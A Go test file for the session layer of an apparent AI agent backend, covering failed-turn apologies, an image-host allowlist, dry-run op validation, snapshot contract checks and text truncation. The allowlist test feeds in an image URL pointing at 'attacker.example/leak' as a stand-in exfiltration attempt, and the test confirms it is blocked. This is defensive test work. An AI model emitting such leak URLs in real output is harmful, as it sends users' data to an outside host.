package session

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/hejijunhao/corellia/backend/internal/contract/gen"
	"github.com/hejijunhao/corellia/backend/internal/runtime"
)

func TestFailedTurnIsNotSilent(t *testing.T) {
	rt := &scripted{events: []runtime.Event{
		{Kind: runtime.EventTextDelta, Text: "Let me"},
		{Kind: runtime.EventError, Err: errBoom, Fatal: true},
	}}
	s := New(Options{Registry: reg(t), Runtime: rt})
	defer s.Close()
	ch, unsub := s.Subscribe(0)
	defer unsub()
	id, _, _ := s.StartTurn("x", runtime.SourceKeyboard)
	evs := drainUntil(t, ch, "turn_done", id)
	var speech []string
	var done map[string]any
	statusCard := false
	for _, e := range evs {
		switch e["type"] {
		case "speech":
			speech = append(speech, e["text"].(string))
		case "turn_done":
			done = e
		case "spec_op":
			if op, _ := e["op"].(map[string]any); op["id"] == "status_card_text" {
				statusCard = true
			}
		}
	}
	if done["status"] != "failed" {
		t.Fatalf("status = %v", done["status"])
	}
	text, _ := done["text"].(string)
	if !strings.Contains(text, "Let me") || !strings.Contains(text, "Sorry") || !strings.Contains(text, "boom") {
		t.Fatalf("turn_done text = %q", text)
	}
	if len(speech) == 0 || !strings.Contains(strings.Join(speech, " "), "Sorry") {
		t.Fatalf("no apology spoken: %v", speech)
	}
	if !statusCard {
		t.Fatal("no status card shown")
	}
	s.WaitTurn(id)
	tr := s.Snapshot()["transcript"].([]gen.TranscriptEntry)
	if last := tr[len(tr)-1]; last.Role != gen.TranscriptEntryRoleAgent || !strings.Contains(last.Text, "Sorry") {
		t.Fatalf("transcript tail = %+v", last)
	}
}

type boom struct{}

func (boom) Error() string { return "boom: upstream HTTP 500" }

var errBoom = boom{}

func TestImageHostAllowlist(t *testing.T) {
	rt := &scripted{events: []runtime.Event{
		op(`{"op":"add_node","id":"bad","node":{"type":"Image","props":{"src":"https://attacker.example/leak?d=1","alt":"x"}}}`),
		op(`{"op":"add_node","id":"good","node":{"type":"Image","props":{"src":"https://upload.wikimedia.org/a.png","alt":"x"}}}`),
		op(`{"op":"set_props","id":"good","props":{"src":"https://evil.example/b.png"}}`),
		op(`{"op":"done"}`),
		{Kind: runtime.EventDone},
	}}
	s := New(Options{Registry: reg(t), Runtime: rt, ImageHosts: []string{"upload.wikimedia.org"}})
	defer s.Close()
	ch, unsub := s.Subscribe(0)
	defer unsub()
	id, _, _ := s.StartTurn("x", runtime.SourceKeyboard)
	evs := drainUntil(t, ch, "turn_done", id)
	var codes []string
	for _, e := range evs {
		if e["type"] == "error" {
			codes = append(codes, e["code"].(string))
		}
	}
	if len(codes) != 2 || codes[0] != "image_host_not_allowed" || codes[1] != "image_host_not_allowed" {
		t.Fatalf("error codes = %v", codes)
	}
	s.WaitTurn(id)
	spec := s.Spec()
	if _, ok := spec.Nodes["bad"]; ok {
		t.Fatal("disallowed image applied")
	}
	if src := spec.Nodes["good"].Props["src"]; src != "https://upload.wikimedia.org/a.png" {
		t.Fatalf("set_props to a disallowed host went through: %v", src)
	}
}

func TestDryRunOpsReportsPerOpIssues(t *testing.T) {
	s := New(Options{Registry: reg(t), Runtime: &scripted{}, ImageHosts: []string{}})
	defer s.Close()
	ops := []json.RawMessage{
		json.RawMessage(`{"op":"add_node","id":"a","node":{"type":"Status","props":{"text":"ok"}}}`),
		json.RawMessage(`{"op":"set_root","id":"a"}`),
		json.RawMessage(`{"op":"add_node","id":"b","node":{"type":"Iframe","props":{}}}`),
		json.RawMessage(`{"op":"add_node","id":"c","node":{"type":"Image","props":{"src":"https://x.example/i.png","alt":"i"}}}`),
		json.RawMessage(`{"op":"set_slot","id":"a","slot":"body","children":["zzz"]}`),
	}
	issues := s.DryRunOps(ops)
	if len(issues) != 3 {
		t.Fatalf("issues = %+v", issues)
	}
	if issues[0].Index != 2 || issues[0].Code != "unknown_component" {
		t.Errorf("issue 0 = %+v", issues[0])
	}
	if issues[1].Index != 3 || issues[1].Code != "image_host_not_allowed" {
		t.Errorf("issue 1 = %+v", issues[1])
	}
	if issues[2].Index != 4 {
		t.Errorf("issue 2 = %+v", issues[2])
	}
	if len(s.Spec().Nodes) != 0 {
		t.Fatal("dry run changed the spec")
	}
}

func TestFreshSnapshotIsOnContract(t *testing.T) {
	r := reg(t)
	s := New(Options{Registry: r, Runtime: &scripted{}})
	defer s.Close()
	snap := s.Snapshot()
	snap["type"], snap["seq"], snap["ts"] = "session", 0, s.o.Now().Format(time.RFC3339Nano)
	raw, _ := json.Marshal(snap)
	if strings.Contains(string(raw), `"transcript":null`) || strings.Contains(string(raw), `"pending_proposals":null`) {
		t.Fatalf("nil slices leak as null: %s", raw)
	}
	var generic any
	_ = json.Unmarshal(raw, &generic)
	if err := r.ValidateEvent(generic); err != nil {
		t.Fatalf("fresh snapshot off-contract: %v", err)
	}
}

func TestClearKeepsPendingConfirmCard(t *testing.T) {
	s, _, _ := gated(t)
	ch, unsub := s.Subscribe(0)
	defer unsub()
	id, _, _ := s.StartTurn("remind me at 17:00 to call Ana", runtime.SourceKeyboard)
	drainUntil(t, ch, "turn_done", id)
	s.WaitTurn(id)
	var cardID string
	for nid, n := range s.Spec().Nodes {
		if n.Type == "Confirm" {
			cardID = nid
		}
	}
	if cardID == "" {
		t.Fatal("no confirm card after the proposal")
	}
	// The next turn starts its visual with clear (the local runtime's time card does).
	id2, _, _ := s.StartTurn("what time is it", runtime.SourceKeyboard)
	drainUntil(t, ch, "turn_done", id2)
	s.WaitTurn(id2)
	if _, ok := s.Spec().Nodes[cardID]; !ok {
		t.Fatalf("confirm card %s vanished after clear while the proposal is still pending", cardID)
	}
	if s.ActiveTurn() != "" {
		t.Fatal("turn still active")
	}
}

func TestTruncateIsUTF8Safe(t *testing.T) {
	if got := truncate("héllo wörld", 4); got != "héll…" {
		t.Errorf("truncate = %q", got)
	}
	if got := truncate("日本語テキスト", 3); got != "日本語…" {
		t.Errorf("truncate = %q", got)
	}
	if got := truncate("short", 10); got != "short" {
		t.Errorf("truncate = %q", got)
	}
}
